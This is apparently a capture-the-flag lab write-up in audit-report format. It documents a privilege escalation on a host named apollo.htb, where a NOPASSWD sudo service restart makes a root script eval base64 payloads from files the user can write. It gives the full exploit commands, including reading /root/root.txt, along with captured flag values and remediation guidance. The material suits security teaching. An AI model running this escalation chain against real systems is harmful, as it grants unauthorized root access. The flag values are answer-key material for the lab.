# Apollo Platform (apollo.htb) — Security Assessment Write-Up

**Target:** apollo.htb (192.168.56.101)
**Date:** September 2026
**Type:** Lab exploitation exercise, documented in audit-report format
**Outcome:** Full compromise — root-level command execution achieved

---

## Executive Summary

The Apollo Platform host was fully compromised starting from an initial SSH
foothold as a low-privilege `git_deploy` account. A misconfigured `sudo`
grant allowed `git_deploy` to restart a systemd service whose script logic
executed attacker-controlled, base64-encoded shell commands as **root**,
with no integrity or authenticity checks on either the trigger condition or
the payload itself. This resulted in full root command execution and
disclosure of the root flag. Separately, an internal backup/secure
directory was found exposed under the web root, leaking internal account
names and base64-"obfuscated" (not encrypted) credential-like data — a
secondary, independently exploitable information-disclosure issue.

No traditional `user.txt` exists on this host. A root-level filesystem
search (`find / -iname "*flag*"` run via the root code-execution primitive)
confirmed the only flag-like artifacts on disk are the root flag and four
staged achievement markers under `/opt/asc/achievements/`, indicating the
box is designed around milestone-based flags rather than a user/root pair.

---

## Flags Captured

| Flag | Value |
|---|---|
| Root flag | `7c6a180b36896a0a8c02787eeafb0e4c` |
| Achievement — Step 1 | `ASC{ground_station_accessed}` |
| Achievement — Step 2 | `ASC{telemetry_configured}` |
| Achievement — Step 3 | `ASC{command_payload_loaded}` |
| Achievement — Step 4 | `ASC{validation_bypassed}` |

No `user.txt` was present anywhere on the filesystem (confirmed via
authoritative root-level `find`). The two files matching that name under
`/var/www/html/.internal/` are decoys — see Finding 3.

---

## Attack Path

### 1. Initial Foothold
Access was obtained as `git_deploy` via SSH key authentication:

```bash
ssh -i /tmp/apollo_key git_deploy@192.168.56.101
```

This landed a real interactive shell (`git_deploy@devops:~$`) with no
password required — a working low-privilege foothold.

### 2. Privilege Enumeration
`sudo -l` revealed a single, narrowly-scoped but ultimately fatal
permission:

```
User git_deploy may run the following commands on devops:
    (root) NOPASSWD: /usr/bin/systemctl restart asc-mission.service
```

On its own, restarting a service isn't dangerous — the risk depends
entirely on what that service does and whether its inputs are trusted.

### 3. Service Logic Analysis
`asc-mission.service` executes `/opt/asc/commands/processor.sh` as root.
Reading the script revealed:

- Several decoy checks (ground station status, a "heartbeat," a
  date-based security token) that are logged but **never actually gate
  execution**.
- The real logic in `process_telemetry()`:
  1. Reads `/opt/asc/validation/status.ok`, base64-decodes it, and checks
     whether the result equals the literal string `EXECUTE_COMMAND`.
  2. If true, reads `/opt/asc/commands/payload.bin`, base64-decodes it,
     and passes the result directly to `eval`.

```bash
if [ "$decoded_flag" = "EXECUTE_COMMAND" ]; then
    if [ -f "$command_payload" ]; then
        local payload_data=$(cat "$command_payload")
        local decoded_payload=$(echo "$payload_data" | base64 -d)
        eval "$decoded_payload" 2>/dev/null
    fi
fi
```

### 4. Permission Check on Inputs
Both control files were writable by `git_deploy`:

```
-rw-rw-r-- 1 git_deploy git_deploy   29 status.ok        (group-writable)
-rw-rw-r-- 1 git_deploy git_deploy    0 payload.bin       (owner-writable)
```

Neither file is protected by the service or restricted to root — meaning
any user permitted to restart the service (even via a single narrowly
scoped `sudo` rule) can fully control what that service executes.

### 5. Exploitation
```bash
# Trigger condition
echo -n 'EXECUTE_COMMAND' | base64 > /opt/asc/validation/status.ok

# Root payload
echo -n 'cat /root/root.txt > /tmp/root_flag.txt; chmod 644 /tmp/root_flag.txt' \
  | base64 > /opt/asc/commands/payload.bin

# Trigger execution via the permitted sudo command
sudo /usr/bin/systemctl restart asc-mission.service
sleep 2
cat /tmp/root_flag.txt
```

Result: `7c6a180b36896a0a8c02787eeafb0e4c` — confirmed root-level arbitrary
command execution. The same primitive was reused to enumerate the
filesystem as root (`find`, directory listings) to confirm no other
credentialed pivot path existed and to locate the achievement flags.

---

## Findings

### Finding 1 — Privilege Escalation via Unrestricted Service Restart (Critical)
A `NOPASSWD` sudo grant permitted `git_deploy` to restart a service whose
execution behavior is fully determined by files that same user could
write. The `sudo` restriction to a single command was ineffective because
the *content* the command acted on was not similarly restricted — the
control was scoped to the wrong layer.

### Finding 2 — Unsafe Use of `eval` on Externally-Controlled Input (Critical)
`processor.sh` decodes and `eval`s the contents of an attacker-writable
file with no validation, signing, or allow-listing. This is a textbook
arbitrary-command-execution primitive disguised as a "telemetry
processor." Base64 encoding was used as if it were a security control; it
provides no confidentiality or integrity guarantee whatsoever.

### Finding 3 — Sensitive Data Exposure Under Web Root (Medium)
`/var/www/html/.internal/backup/user.txt` and
`/var/www/html/.internal/secure/user.txt` contain internal account
metadata, integration credentials (GitLab, Jenkins), and legacy
credentials, all "obfuscated" with base64 rather than encrypted:

- Decoded values (`nexus_operator`, `gitlab_pass`, `jenkins_token`,
  `old_admin123`, `api_legacy_key`) are low-entropy, guessable strings —
  consistent with either decoy data or genuinely weak legacy credentials
  that should be rotated regardless.
- Storing this kind of data under a web-servable path (even in a
  dot-prefixed subdirectory) risks direct HTTP disclosure if directory
  listing or predictable paths are ever reachable externally.

### Finding 4 — Security Controls That Don't Enforce Anything (Low/Informational)
`processor.sh` contains a security-token check and other validation logic
that is computed and logged but never actually used to gate execution.
This is a false-assurance risk: anyone reviewing the script's surface-level
structure without tracing control flow could reasonably (and incorrectly)
conclude the service is protected.

### Finding 5 — Overly Broad File Ownership on Service Control Files
`/opt/asc/commands/` and `/opt/asc/validation/` are entirely owned by
`git_deploy` rather than the service account or root. A deploy account
should not own the control-plane files for a root-executed service it is
only meant to restart.

---

## Remediation Recommendations

| # | Recommendation | Priority |
|---|---|---|
| 1 | Remove the `NOPASSWD` sudo grant for arbitrary restarts of `asc-mission.service`, or replace it with a locked-down wrapper that doesn't let the restarting user influence execution content. | Critical |
| 2 | Eliminate `eval` on any externally-supplied data in `processor.sh`. Replace with a fixed, allow-listed set of operations, or an internal API/queue the service consumes instead of a flat file. | Critical |
| 3 | Change ownership of `/opt/asc/commands/` and `/opt/asc/validation/` to root (or a dedicated service account), removing write access for `git_deploy` and any other non-service account. | Critical |
| 4 | If a trigger/payload mechanism is required, sign payloads (e.g., HMAC with a key only root can read) and verify the signature before execution — base64 is not a substitute for authentication. | High |
| 5 | Remove `/var/www/html/.internal/` from the web-servable directory entirely; relocate any legitimate backup/secure data outside the web root with root-only permissions. | High |
| 6 | Rotate all credentials referenced in the exposed documents (GitLab, Jenkins, legacy admin/API accounts) regardless of whether they were "real" or decoy — assume compromise once exposed. | High |
| 7 | Remove or properly implement the dead security checks (token validation, heartbeat) in `processor.sh` — decorative controls create false assurance during review. | Medium |
| 8 | Add logging/alerting on writes to `/opt/asc/commands/` and `/opt/asc/validation/`, and on restarts of `asc-mission.service` outside of expected deployment windows. | Medium |
| 9 | Apply least-privilege review to the `git_deploy` account generally — audit group memberships and confirm no other services follow this same "restart-triggers-eval" pattern. | Medium |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Details |
|---|---|---|
| Initial Access | T1078 – Valid Accounts | SSH key-based access as `git_deploy` |
| Privilege Escalation | T1548.003 – Sudo and Sudo Caching | Abused scoped `NOPASSWD` sudo rule to trigger root execution |
| Execution | T1059.004 – Unix Shell | `eval` of base64-decoded shell commands via `processor.sh` |
| Defense Evasion | T1027 – Obfuscated Files or Information | Base64 encoding used (ineffectively) to obscure trigger/payload content |
| Credential Access | T1552.001 – Credentials In Files | Base64-"encoded" credentials stored under web-accessible path |
| Discovery | T1083 / T1057 – File and Directory / Process Discovery | Filesystem and process enumeration to locate the real user-facing artifacts and rule out decoys |

---

## Lessons / Teaching Points

- A `sudo` rule scoped to a single command is only as safe as everything
  that command's execution depends on. Restricting the verb (`systemctl
  restart`) without restricting the inputs that verb acts on (writable
  service-controlled files) is a common and easy-to-miss escalation path.
- Encoding is not encryption and is not authentication. Base64 appeared
  three separate times in this chain (trigger flag, payload, "credential"
  documents) and provided no real protection in any of them.
- Decoy/dead code (unused security checks) in a script under review can
  mislead a defender doing a quick read-through; control-flow tracing,
  not just presence-of-checks, is necessary during a real audit.
